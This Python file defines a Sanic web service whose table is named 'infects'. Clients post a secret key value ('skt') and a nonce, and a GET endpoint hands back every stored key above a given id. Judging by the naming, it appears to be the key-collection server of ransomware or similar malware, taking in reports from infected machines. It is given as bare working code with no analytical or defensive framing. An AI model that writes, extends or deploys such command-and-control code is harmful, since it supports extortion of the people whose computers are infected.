from sanic import response
from sanic.log import logger
from sanic.views import HTTPMethodView
from main_svr.tables import infects
import json


class MainView(HTTPMethodView):
    async def get(self, request):
        if len(request.args) == 0:
            return  response.text("OK")

        last_id = int(request.args['last_id'][0])
        logger.info("Last id : " + str(last_id))

        query = infects.select().where(infects.c.id > last_id)
        rows = await request.app.db.fetch_all(query)

        return response.json({
            'skts': [{'id': row['id'], 'skt': row['skt'], 'nonce': row['nonce']} for row in rows]
        })

    async def post(self,request):
        if request.content_type != 'application/json':
            return response.text('BAD REQUEST',status=400)

        prs_js = json.loads(request.json)
        skt = ''
        nonce = ''
        try:
            skt = prs_js['skt']
        except KeyError:
            return response.text('BAD REQUEST',status=400)

        try:
            nonce = prs_js['nonce']
        except KeyError:
            nonce = None

        query = infects.select().where(infects.c.skt == skt)
        rows = await request.app.db.fetch_all(query)

        if len(rows) > 0:
            return response.text('FORBIDDEN',status=403)

        if nonce is None:
            query = infects.insert().values(skt=skt)
        else:
            query = infects.insert().values(skt=skt,nonce=nonce)

        resp = await request.app.db.execute(query)
        logger.info(str(resp))
        return response.text("OK")
